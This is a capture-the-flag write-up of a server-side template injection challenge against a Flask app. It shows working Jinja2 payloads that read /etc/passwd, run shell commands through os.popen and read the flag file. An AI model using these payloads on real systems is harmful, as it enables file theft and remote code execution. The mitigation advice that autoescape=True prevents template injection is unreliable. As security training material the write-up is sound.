
# SSTI-1 - Server-Side Template Injection

## Challenge Information

- **Category**: Web Exploitation
    
- **Points**: 200
    
- **Author**: Venax
    
- **Description**:
    
    - A website allows users to announce messages.
        
    - Input sanitization is claimed to be implemented.
        
    - Our goal is to bypass it and exploit SSTI to obtain the flag.
        

---

## Identifying the SSTI Vulnerability

To check for SSTI, I injected `{{7*7}}` into the input field. If the application is vulnerable, it should evaluate the expression and return `49` instead of displaying it as a string.

### **Result:**

- The output was `49`, confirming that the template engine executes user input as Python code.
    

---

## **Exploring the File System**

Once SSTI was confirmed, I tested whether I could access files on the system. I injected:

```
{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}
```

### **Explanation:**

- The payload exploits Flask’s SSTI vulnerability to access global objects.
    
- It calls Python’s `open()` function to read the `/etc/passwd` file, a standard file on Linux systems listing user accounts.
    
- The contents of `/etc/passwd` were displayed, confirming file read access.
    

---

## **Listing Files and Directories**

Next, I attempted to list all files and directories recursively by injecting:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

### **Explanation:**

- Uses `__import__()` to import the `os` module.
    
- Calls `popen('ls -R')` to list files and directories recursively.
    
- This revealed a file named `flag.txt`.
    

---

## **Retrieving the Flag**

To read the flag, I injected:

```
{{request.application.__globals__.__builtins__.open('flag.txt').read()}}
```


In this CTF challenge I exploited an SSTI vulnerability in a flask web application to gain access to the server’s internal workings and obtain the flag. This run-in of mine with SSTI provided valuable insight into how template injection can be leveraged in order to execute arbitrary code on a server. With that in mind, I learned how crucial it is to validate user input in order to avoid template injection vulnerabilities.

![[Pasted image 20250308112419.png]]


### **Outcome:**

- The contents of `flag.txt` were successfully displayed, revealing the flag.
    

---

## **Lessons Learned & Mitigation**

This challenge demonstrated how SSTI can be leveraged to execute arbitrary code on a server. To prevent such vulnerabilities:

- **Disable arbitrary code execution**: Use safe rendering engines like Jinja2 with `autoescape=True`.
    
- **Strict input validation**: Implement whitelisting for user input.
    
- **Sandboxing**: Restrict template rendering to avoid access to sensitive objects.
    

By implementing these security measures, we can prevent SSTI attacks and protect web applications from unauthorized access and remote code execution.